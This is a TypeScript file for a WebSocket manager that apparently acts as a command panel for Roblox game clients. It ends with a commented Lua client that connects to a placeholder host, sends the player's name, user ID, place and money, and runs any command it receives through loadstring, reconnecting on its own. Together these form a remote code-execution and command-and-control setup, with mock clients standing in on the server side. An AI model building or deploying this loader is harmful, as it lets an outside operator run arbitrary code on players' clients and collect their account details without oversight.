
/**
 * WebSocket Server implementation for Roblox client connectivity
 * This utility provides a WebSocket server that Roblox clients can connect to
 */

// Store connected clients
interface ConnectedClient {
  id: string;
  socket: WebSocket;
  username: string;
  place: string;
  userId: number;
  money?: number;
  lastSeen: string;
  online: boolean;
  additionalData?: Record<string, any>;
}

class WebSocketManager {
  private static instance: WebSocketManager;
  private server: WebSocket | null = null;
  private clients: Map<string, ConnectedClient> = new Map();
  private listeners: Map<string, Set<(data: any) => void>> = new Map();

  private constructor() {
    // Initialize WebSocket server if we're in a browser environment
    if (typeof window !== 'undefined') {
      this.setupServer();
    }
  }

  public static getInstance(): WebSocketManager {
    if (!WebSocketManager.instance) {
      WebSocketManager.instance = new WebSocketManager();
    }
    return WebSocketManager.instance;
  }

  private setupServer() {
    // In a real application, this would be a WebSocket server URL
    // For this demonstration, we're creating a simple mock implementation
    console.log("Setting up WebSocket server for Roblox client connections");

    // Simulate client connections
    this.simulateClientConnections();

    // Listen for window unload to properly close connections
    window.addEventListener('beforeunload', () => {
      this.clients.forEach(client => {
        if (client.socket) {
          client.socket.close();
        }
      });
    });
  }

  // Method to get all connected clients
  public getConnectedClients(): ConnectedClient[] {
    return Array.from(this.clients.values());
  }

  // Method to handle client connection
  public handleClientConnection(clientData: any) {
    const clientId = `client-${this.clients.size + 1}`;
    
    // Create a client record
    const client: ConnectedClient = {
      id: clientId,
      socket: null as unknown as WebSocket, // In a real implementation, this would be the actual socket
      username: clientData.username || `Player${this.clients.size + 1}`,
      place: clientData.place || "Unknown Place",
      userId: clientData.userId || 0,
      lastSeen: new Date().toISOString(),
      online: true,
      additionalData: clientData.additionalData || {}
    };

    if (clientData.money) {
      client.money = clientData.money;
    }

    // Add to clients map
    this.clients.set(clientId, client);
    
    // Emit client connected event
    this.emit('clientConnected', client);
    
    console.log(`Client connected: ${clientId}`, client);
    
    return clientId;
  }

  // Method to send a command to specific clients
  public sendCommandToClients(clientIds: string[], command: string) {
    const payload = {
      action: "execute_command",
      data: {
        command: command
      }
    };

    console.log(`Sending command to clients: ${clientIds.join(', ')}`, payload);

    // In a real implementation, this would send the payload to each client's WebSocket
    clientIds.forEach(clientId => {
      const client = this.clients.get(clientId);
      if (client && client.online) {
        // Simulate sending to the client
        console.log(`Sending to client ${clientId}:`, payload);
        
        // In a real implementation:
        // client.socket.send(JSON.stringify(payload));
      }
    });

    return true;
  }

  // Method to handle client disconnection
  public handleClientDisconnection(clientId: string) {
    const client = this.clients.get(clientId);
    if (client) {
      client.online = false;
      client.lastSeen = new Date().toISOString();
      
      // Emit client disconnected event
      this.emit('clientDisconnected', client);
      
      console.log(`Client disconnected: ${clientId}`);
    }
  }

  // Method to register event listeners
  public on(event: string, callback: (data: any) => void) {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, new Set());
    }
    this.listeners.get(event)?.add(callback);
    
    return () => {
      this.listeners.get(event)?.delete(callback);
    };
  }

  // Method to emit events
  private emit(event: string, data: any) {
    this.listeners.get(event)?.forEach(callback => {
      callback(data);
    });
  }

  // For demonstration only: simulate client connections/disconnections
  private simulateClientConnections() {
    // Create some initial mock clients
    const mockClientData = [
      {
        username: "PlayerOne",
        place: "Natural Disaster Survival",
        userId: 1001,
        money: 5000,
        additionalData: {
          level: 10,
          inventory: ["sword", "shield"]
        }
      },
      {
        username: "PlayerTwo",
        place: "Adopt Me!",
        userId: 1002,
        money: 7500,
        additionalData: {
          pets: ["dog", "cat", "dragon"]
        }
      },
      {
        username: "PlayerThree",
        place: "Brookhaven",
        userId: 1003,
        money: 3200
      },
      {
        username: "PlayerFour",
        place: "Arsenal",
        userId: 1004,
        money: 8900
      },
      {
        username: "PlayerFive",
        place: "Murder Mystery 2",
        userId: 1005,
        money: 12000
      }
    ];

    // Add mock clients
    mockClientData.forEach(data => {
      this.handleClientConnection(data);
    });

    // Simulate random client status changes
    setInterval(() => {
      const clientIds = Array.from(this.clients.keys());
      if (clientIds.length > 0) {
        const randomClientId = clientIds[Math.floor(Math.random() * clientIds.length)];
        const client = this.clients.get(randomClientId);
        
        if (client && Math.random() > 0.7) {
          client.online = !client.online;
          client.lastSeen = new Date().toISOString();
          
          // Emit status change event
          this.emit('clientStatusChanged', client);
        }
      }
    }, 20000); // Every 20 seconds
  }
}

export default WebSocketManager;

// Lua code example for Roblox clients to connect to this WebSocket server:
/*
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Function to establish WebSocket connection
local function connectToWebSocket()
    local websocket
    
    -- Try to create a WebSocket connection
    local success, error = pcall(function()
        websocket = WebSocket.connect("wss://yourdomain.com/ws")
    end)
    
    if not success then
        warn("Failed to connect to WebSocket: " .. tostring(error))
        return
    end
    
    -- Handle incoming messages
    websocket.OnMessage:Connect(function(message)
        local success, data = pcall(function()
            return HttpService:JSONDecode(message)
        end)
        
        if success then
            -- Handle different message types
            if data.action == "execute_command" then
                local command = data.data.command
                print("Received command: " .. command)
                
                -- Execute the command
                pcall(function()
                    loadstring(command)()
                end)
            end
        else
            warn("Failed to parse message: " .. message)
        end
    end)
    
    -- Send initial client data
    local clientData = {
        action = "client_connected",
        data = {
            userId = player.UserId,
            username = player.Name,
            place = game.PlaceId,
            money = player.leaderstats and player.leaderstats.Money and player.leaderstats.Money.Value or 0,
            additionalData = {
                -- Add any additional data you want to send here
            }
        }
    }
    
    websocket:Send(HttpService:JSONEncode(clientData))
    
    -- Keep sending heartbeat
    spawn(function()
        while wait(30) do
            if websocket.ReadyState == 1 then -- 1 means the connection is open
                websocket:Send(HttpService:JSONEncode({
                    action = "heartbeat",
                    data = {
                        userId = player.UserId
                    }
                }))
            else
                break
            end
        end
    end)
    
    return websocket
end

-- Start connection
local ws = connectToWebSocket()

-- Reconnect if disconnected
spawn(function()
    while wait(60) do -- Check every minute
        if not ws or ws.ReadyState ~= 1 then
            ws = connectToWebSocket()
        end
    end
end)
*/
